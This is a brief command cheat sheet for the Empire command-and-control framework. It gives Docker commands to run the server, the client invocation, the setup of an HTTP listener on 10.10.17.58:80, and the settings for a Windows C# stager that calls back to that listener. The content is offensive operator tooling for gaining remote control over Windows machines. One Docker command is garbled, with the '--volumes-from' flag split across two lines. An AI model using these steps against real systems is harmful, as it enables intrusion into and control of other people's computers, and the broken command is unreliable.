# empire server

% empire, windows, c2

## pull latest image
```bash
docker pull bcsecurity/empire:latest
```

## server
```bash
docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
```

## server (persistent storage)
```bash
docker create -v <empire_storage_path> --name data bcsecurity/empire:latest && docker run -it -p 1337:1337 -p 5000:5000 --vol:w
umes-from data bcsecurity/empire:latest
```

= empire_storage_path: '/empire'

## client
```bash
empire-client --config ~/empire-client.yaml
```

## http listener
```bash
uselistener http
set Name zephyr
set Host http://10.10.17.58
set Port 80
execute
main
```

## csharp stager
```bash
usestager windows_csharp_exe
set DotNetVersion net35
set Listener zephyr
```